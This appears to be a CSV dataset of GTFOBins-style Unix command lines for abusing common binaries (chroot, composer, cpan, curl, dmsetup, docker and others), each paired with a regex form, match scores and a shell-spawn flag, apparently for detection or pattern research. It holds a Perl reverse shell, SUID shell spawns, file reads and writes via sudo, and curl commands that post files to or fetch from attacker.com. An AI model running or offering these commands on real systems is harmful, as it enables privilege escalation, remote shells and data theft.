ocode,code,word_count,match_count,match_score,hack
check_log -F $LFILE -O $OUTPUT,check_log -F \$LFILE -O \$OUTPUT,5,0,0.06451612903225806,0
cat $OUTPUT,cat \$OUTPUT,2,0,0.08333333333333333,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
INPUT=input_file,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.7647058823529411,0
sudo check_log -F $INPUT -O $LFILE,sudo check_log -F \$INPUT -O \$LFILE,6,0,0.05714285714285714,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
check_memory --extra-opts=@$LFILE,"check_memory [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$LFILE",2,2,0.8529411764705882,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo check_memory --extra-opts=@$LFILE,"sudo check_memory [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$LFILE",3,2,0.7435897435897436,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
check_raid --extra-opts=@$LFILE,"check_raid [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$LFILE",2,2,0.90625,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo check_raid --extra-opts=@$LFILE,"sudo check_raid [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$LFILE",3,2,0.7837837837837838,0
COMMAND=id,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.8181818181818183,0
OUTPUT=output_file,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND | tee $OUTPUT"" > $TF","echo ""\$COMMAND \| tee \$OUTPUT"" > \$TF",7,0,0.1111111111111111,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
check_ssl_cert --curl-bin $TF -H example.net,check_ssl_cert --curl-bin \$TF -H example\.net,5,0,0.044444444444444446,0
cat $OUTPUT,cat \$OUTPUT,2,0,0.08333333333333333,0
COMMAND=id,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.8181818181818183,0
OUTPUT=output_file,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""$COMMAND | tee $OUTPUT"" > $TF","echo ""\$COMMAND \| tee \$OUTPUT"" > \$TF",7,0,0.1111111111111111,0
chmod +x $TF,chmod \+x \$TF,3,0,0.15384615384615385,0
umask 022,umask 022,2,0,0.0,0
check_ssl_cert --curl-bin $TF -H example.net,check_ssl_cert --curl-bin \$TF -H example\.net,5,0,0.044444444444444446,0
cat $OUTPUT,cat \$OUTPUT,2,0,0.08333333333333333,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
check_statusfile $LFILE,check_statusfile \$LFILE,2,0,0.041666666666666664,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo check_statusfile $LFILE,sudo check_statusfile \$LFILE,3,0,0.034482758620689655,0
sudo install -m =xs $(which chmod) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which chmod\) \.",7,1,0.7297297297297297,0
LFILE=file_to_change,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.4761904761904763,0
./chmod 6777 $LFILE,\./chmod 6777 \$LFILE,3,0,0.1,0
LFILE=file_to_change,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.4761904761904763,0
sudo chmod 6777 $LFILE,sudo chmod 6777 \$LFILE,4,0,0.043478260869565216,0
sudo install -m =xs $(which chown) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which chown\) \.",7,1,0.7297297297297297,0
LFILE=file_to_change,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.4761904761904763,0
./chown $(id -un):$(id -gn) $LFILE,\./chown \$\(id -un\):\$\(id -gn\) \$LFILE,5,0,0.22857142857142856,0
LFILE=file_to_change,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.4761904761904763,0
sudo chown $(id -un):$(id -gn) $LFILE,sudo chown \$\(id -un\):\$\(id -gn\) \$LFILE,6,0,0.18421052631578946,0
sudo install -m =xs $(which chroot) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which chroot\) \.",7,1,0.7105263157894737,0
./chroot / /bin/sh -p,\./chroot / /bin/sh -p,4,0,0.045454545454545456,1
sudo chroot /,sudo chroot /,3,0,0.0,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x","echo 'CALL ""SYSTEM"" USING ""/bin/sh""\.' > \$TF/x",7,0,0.043478260869565216,1
cobc -xFj --frelax-syntax-checks $TF/x,cobc -xFj --frelax-syntax-checks \$TF/x,4,0,0.02564102564102564,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo 'CALL ""SYSTEM"" USING ""/bin/sh"".' > $TF/x","echo 'CALL ""SYSTEM"" USING ""/bin/sh""\.' > \$TF/x",7,0,0.043478260869565216,1
sudo cobc -xFj --frelax-syntax-checks $TF/x,sudo cobc -xFj --frelax-syntax-checks \$TF/x,5,0,0.022727272727272728,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
column $LFILE,column \$LFILE,2,0,0.07142857142857142,0
sudo install -m =xs $(which column) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which column\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./column $LFILE,\./column \$LFILE,2,0,0.125,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo column $LFILE,sudo column \$LFILE,3,0,0.05263157894736842,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
comm $LFILE /dev/null 2>/dev/null,comm \$LFILE /dev/null 2>/dev/null,4,0,0.029411764705882353,0
sudo install -m =xs $(which comm) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which comm\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
comm $LFILE /dev/null 2>/dev/null,comm \$LFILE /dev/null 2>/dev/null,4,0,0.029411764705882353,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo comm $LFILE /dev/null 2>/dev/null,sudo comm \$LFILE /dev/null 2>/dev/null,5,0,0.02564102564102564,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json","echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >\$TF/composer\.json",7,0,0.027777777777777776,1
composer --working-dir=$TF run-script x,composer [\w\-_]+=\$TF run-script x,4,1,0.3,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json","echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >\$TF/composer\.json",7,0,0.027777777777777776,1
sudo composer --working-dir=$TF run-script x,sudo composer [\w\-_]+=\$TF run-script x,5,1,0.26666666666666666,0
sudo install -m =xs $(which composer) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which composer\) \.",7,1,0.675,0
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
"echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >$TF/composer.json","echo '{""scripts"":{""x"":""/bin/sh -i 0<&3 1>&3 2>&3""}}' >\$TF/composer\.json",7,0,0.027777777777777776,1
./composer --working-dir=$TF run-script x,\./composer [\w\-_]+=\$TF run-script x,4,1,0.30952380952380953,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'exec ""/bin/sh"";' >$TF","echo 'exec ""/bin/sh""\;' >\$TF",4,0,0.07142857142857142,1
cowsay -f $TF x,cowsay -f \$TF x,4,0,0.0625,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'exec ""/bin/sh"";' >$TF","echo 'exec ""/bin/sh""\;' >\$TF",4,0,0.07142857142857142,1
sudo cowsay -f $TF x,sudo cowsay -f \$TF x,5,0,0.047619047619047616,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'exec ""/bin/sh"";' >$TF","echo 'exec ""/bin/sh""\;' >\$TF",4,0,0.07142857142857142,1
cowthink -f $TF x,cowthink -f \$TF x,4,0,0.05555555555555555,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo 'exec ""/bin/sh"";' >$TF","echo 'exec ""/bin/sh""\;' >\$TF",4,0,0.07142857142857142,1
sudo cowthink -f $TF x,sudo cowthink -f \$TF x,5,0,0.043478260869565216,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""DATA"" | cp /dev/stdin ""$LFILE""","echo ""DATA"" \| cp /dev/stdin ""\$LFILE""",6,0,0.05405405405405406,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"cp ""$LFILE"" /dev/stdout","cp ""\$LFILE"" /dev/stdout",3,0,0.041666666666666664,0
sudo install -m =xs $(which cp) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which cp\) \.",7,1,0.7941176470588235,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""DATA"" | ./cp /dev/stdin ""$LFILE""","echo ""DATA"" \| \./cp /dev/stdin ""\$LFILE""",6,0,0.07692307692307693,0
sudo install -m =xs $(which cp) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which cp\) \.",7,1,0.7941176470588235,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""DATA"" > $TF","echo ""DATA"" > \$TF",4,0,0.05555555555555555,0
./cp $TF $LFILE,\./cp \$TF \$LFILE,3,0,0.1875,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""DATA"" | sudo cp /dev/stdin ""$LFILE""","echo ""DATA"" \| sudo cp /dev/stdin ""\$LFILE""",7,0,0.047619047619047616,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""DATA"" > $TF","echo ""DATA"" > \$TF",4,0,0.05555555555555555,0
sudo cp $TF $LFILE,sudo cp \$TF \$LFILE,4,0,0.10526315789473684,0
cpan,cpan,1,0,0.0,0
! exec '/bin/bash',! exec '/bin/bash',3,0,0.0,1
export RHOST=localhost,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.3478260869565217,0
export RPORT=9000,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.6666666666666667,0
cpan,cpan,1,0,0.0,0
"! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};","! use Socket\; my \$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$ENV{RHOST}""\; my \$[\w\-_]+=\$ENV{RPORT}\; socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\(""tcp""\)\)\; if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,"">&S""\)\; open\(STDOUT\,"">&S""\)\; open\(STDERR\,"">&S""\)\; exec\(""/bin/sh -i""\)\;}\;",13,3,0.34763948497854075,1
cpan,cpan,1,0,0.0,0
! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();,"! use HTTP::Server::Simple\; my \$[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+HTTP::Server::Simple->new\(\)\; \$server->run\(\)\;",7,2,0.4588235294117647,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
cpan,cpan,1,0,0.0,0
"! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();","! use File::Fetch\; my \$file =[ a-z0-9\.\-\/\'\""_\@]+\(File::Fetch->new\(uri => ""\$ENV{URL}""\)\)->fetch\(\)\;",9,1,0.4050632911392405,0
sudo cpan,sudo cpan,2,0,0.0,0
! exec '/bin/bash',! exec '/bin/bash',3,0,0.0,1
cpulimit -l 100 -f /bin/sh,cpulimit -l 100 -f /bin/sh,5,0,0.0,1
sudo cpulimit -l 100 -f /bin/sh,sudo cpulimit -l 100 -f /bin/sh,6,0,0.0,1
crash -h,crash -h,2,0,0.0,0
!sh,!sh,1,0,0.0,0
COMMAND='/usr/bin/id',"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.3636363636363635,0
"CRASHPAGER=""$COMMAND"" crash -h","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$COMMAND"" crash -h",3,2,1.032258064516129,0
sudo crash -h,sudo crash -h,3,0,0.0,0
!sh,!sh,1,0,0.0,0
crontab -e,crontab -e,2,0,0.0,0
sudo crontab -e,sudo crontab -e,3,0,0.0,0
csh,csh,1,0,0.0,0
export LFILE=file_to_write,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1481481481481481,0
ash -c 'echo DATA > $LFILE',"ash -c [\'|""]| -e [\'|""]|cat >.*<<.*echo DATA > \$LFILE'",6,1,1.0357142857142858,0
sudo install -m =xs $(which csh) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which csh\) \.",7,1,0.7714285714285715,0
./csh -b,\./csh -b,2,0,0.1111111111111111,0
sudo csh,sudo csh,2,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
csplit $LFILE 1,csplit \$LFILE 1,3,0,0.0625,0
cat xx01,cat xx01,2,0,0.0,0
sudo install -m =xs $(which csplit) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which csplit\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
csplit $LFILE 1,csplit \$LFILE 1,3,0,0.0625,0
cat xx01,cat xx01,2,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
csplit $LFILE 1,csplit \$LFILE 1,3,0,0.0625,0
cat xx01,cat xx01,2,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,cupsfilter -i application/octet-stream -m application/octet-stream \$LFILE,6,0,0.013513513513513514,0
sudo install -m =xs $(which cupsfilter) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which cupsfilter\) \.",7,1,0.6428571428571429,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,\./cupsfilter -i application/octet-stream -m application/octet-stream \$LFILE,6,0,0.02631578947368421,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE,sudo cupsfilter -i application/octet-stream -m application/octet-stream \$LFILE,7,0,0.012658227848101266,0
URL=http://attacker.com/,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",1,2,1.28,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
curl -X POST -d @$file_to_send $URL,curl -X POST -d @\$[\w\-_\/]+ \$URL,6,1,0.3611111111111111,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
curl $URL -o $LFILE,curl \$URL -o \$LFILE,4,0,0.1,0
LFILE=/tmp/file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.25,0
curl file://$LFILE,curl file://\$LFILE,2,0,0.05263157894736842,0
sudo install -m =xs $(which curl) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which curl\) \.",7,1,0.75,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./curl $URL -o $LFILE,\./curl \$URL -o \$LFILE,4,0,0.13636363636363635,0
URL=http://attacker.com/file_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",1,3,1.1944444444444444,0
LFILE=file_to_save,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo curl $URL -o $LFILE,sudo curl \$URL -o \$LFILE,5,0,0.08,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"cut -d """" -f1 ""$LFILE""","cut -d """" -f1 ""\$LFILE""",5,0,0.043478260869565216,0
sudo install -m =xs $(which cut) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which cut\) \.",7,1,0.7714285714285715,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./cut -d """" -f1 ""$LFILE""","\./cut -d """" -f1 ""\$LFILE""",5,0,0.08,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo cut -d """" -f1 ""$LFILE""","sudo cut -d """" -f1 ""\$LFILE""",6,0,0.03571428571428571,0
dash,dash,1,0,0.0,0
export LFILE=file_to_write,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1481481481481481,0
dash -c 'echo DATA > $LFILE',"dash -c [\'|""]| -e [\'|""]|cat >.*<<.*echo DATA > \$LFILE'",6,1,1.0,0
sudo install -m =xs $(which dash) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which dash\) \.",7,1,0.75,0
./dash -p,\./dash -p,2,0,0.1,0
sudo dash,sudo dash,2,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
date -f $LFILE,date -f \$LFILE,3,0,0.06666666666666667,0
sudo install -m =xs $(which date) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which date\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./date -f $LFILE,\./date -f \$LFILE,3,0,0.11764705882352941,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo date -f $LFILE,sudo date -f \$LFILE,4,0,0.05,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""DATA"" | dd of=$LFILE","echo ""DATA"" \| dd [\w\-_]+=\$LFILE",5,1,0.37037037037037035,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
dd if=$LFILE,dd [\w\-_]+=\$LFILE,2,1,0.6923076923076923,0
sudo install -m =xs $(which dd) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which dd\) \.",7,1,0.7941176470588235,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""data"" | ./dd of=$LFILE","echo ""data"" \| \./dd [\w\-_]+=\$LFILE",5,1,0.3793103448275862,0
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"echo ""data"" | sudo dd of=$LFILE","echo ""data"" \| sudo dd [\w\-_]+=\$LFILE",6,1,0.3125,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"dialog --textbox ""$LFILE"" 0 0","dialog --textbox ""\$LFILE"" 0 0",5,0,0.03333333333333333,0
sudo install -m =xs $(which dialog) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which dialog\) \.",7,1,0.7105263157894737,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"./dialog --textbox ""$LFILE"" 0 0","\./dialog --textbox ""\$LFILE"" 0 0",5,0,0.0625,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo dialog --textbox ""$LFILE"" 0 0","sudo dialog --textbox ""\$LFILE"" 0 0",6,0,0.02857142857142857,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
diff --line-format=%L /dev/null $LFILE,diff [\w\-_]+=%L /dev/null \$LFILE,4,1,0.3333333333333333,0
sudo install -m =xs $(which diff) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which diff\) \.",7,1,0.75,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./diff --line-format=%L /dev/null $LFILE,\./diff [\w\-_]+=%L /dev/null \$LFILE,4,1,0.34146341463414637,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo diff --line-format=%L /dev/null $LFILE,sudo diff [\w\-_]+=%L /dev/null \$LFILE,5,1,0.29545454545454547,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
dig -f $LFILE,dig -f \$LFILE,3,0,0.07142857142857142,0
sudo install -m =xs $(which dig) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which dig\) \.",7,1,0.7714285714285715,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./dig -f $LFILE,\./dig -f \$LFILE,3,0,0.125,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo dig -f $LFILE,sudo dig -f \$LFILE,4,0,0.05263157894736842,0
dmesg -H,dmesg -H,2,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"dmesg -rF ""$LFILE""","dmesg -rF ""\$LFILE""",3,0,0.05263157894736842,0
sudo dmesg -H,sudo dmesg -H,3,0,0.0,0
!/bin/sh,!/bin/sh,1,0,0.0,1
sudo install -m =xs $(which dmsetup) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which dmsetup\) \.",7,1,0.6923076923076923,0
./dmsetup create base <<EOF,\./dmsetup create base <<EOF,4,0,0.03571428571428571,0
0 3534848 linear /dev/loop0 94208,0 3534848 linear /dev/loop0 94208,5,0,0.0,0
EOF,EOF,1,0,0.0,0
./dmsetup ls --exec '/bin/sh -p -s',\./dmsetup ls --exec '/bin/sh -p -s',6,0,0.027777777777777776,1
sudo dmsetup create base <<EOF,sudo dmsetup create base <<EOF,5,0,0.0,0
0 3534848 linear /dev/loop0 94208,0 3534848 linear /dev/loop0 94208,5,0,0.0,0
EOF,EOF,1,0,0.0,0
sudo dmsetup ls --exec '/bin/sh -s',sudo dmsetup ls --exec '/bin/sh -s',6,0,0.0,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
echo 'id' > $TF/x.sh,echo 'id' > \$TF/x\.sh,4,0,0.09523809523809523,0
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF,fpm -n x -s dir -t rpm -a all --before-install \$TF/x\.sh \$TF,12,0,0.05,0
sudo dnf install -y x-1.0-1.noarch.rpm,sudo dnf install -y x-1\.0-1\.noarch\.rpm,5,0,0.07692307692307693,0
docker run -v /:/mnt --rm -it alpine chroot /mnt sh,docker run -v /:/mnt --rm -it alpine chroot /mnt sh,10,0,0.0,0
"CONTAINER_ID=""$(docker run -d alpine)"" # or existing","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$\(docker run -d alpine\)"" # or existing",7,2,0.6415094339622641,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
"echo ""DATA"" > $TF","echo ""DATA"" > \$TF",4,0,0.05555555555555555,0
docker cp $TF $CONTAINER_ID:$TF,docker cp \$TF \$CONTAINER_ID:\$TF,4,0,0.09375,0
docker cp $CONTAINER_ID:$TF file_to_write,docker cp \$CONTAINER_ID:\$TF [\w\-_\/]+,4,1,0.3333333333333333,0
"CONTAINER_ID=""$(docker run -d alpine)""  # or existing","[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\$\(docker run -d alpine\)""  # or existing",8,2,0.6296296296296297,0
TF=$(mktemp),[\w\-_]+=\$\(mktemp\),1,1,0.8461538461538461,0
docker cp file_to_read $CONTAINER_ID:$TF,docker cp [\w\-_\/]+ \$CONTAINER_ID:\$TF,4,1,0.3170731707317073,0
